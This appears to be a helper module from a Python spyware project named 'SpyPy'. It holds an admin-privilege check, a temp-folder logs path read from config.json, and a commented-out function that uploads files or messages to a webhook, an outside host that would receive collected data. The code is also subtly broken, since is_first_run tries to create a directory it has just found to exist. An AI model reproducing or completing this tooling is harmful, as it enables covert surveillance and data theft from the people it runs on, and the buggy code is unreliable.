import os
import ctypes
import platform
import tempfile
import json
import requests

def get_platform():
    return platform.system()

def is_admin():
    if get_platform() == "Windows":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        try:
            return os.getuid() == 0
        except AttributeError:
            return False



def load_config(key):
    with open("config.json", "r") as file:
        config = json.load(file)
        return config[key]
    
def get_logs_path():
    logs_path_dir_name = load_config("logs_path")
    logs_path = os.path.join(tempfile.gettempdir(), logs_path_dir_name)
    return logs_path

def is_first_run():
    logs_path = get_logs_path()
    if not os.path.exists(logs_path):
        return True
    os.mkdir(logs_path)
    return False

#make a function to send either a file or a message to a webhook
'''def send_webhook(webhook, message=None, file=None):
    data = {
        "content": message,
        "username": "SpyPy",
    }
    if file:
        files = {
            "file": open(file, "rb")
        }
        response = requests.post(webhook, data=data, files=files)
    else:
        response = requests.post(webhook, json=data)
    return response'''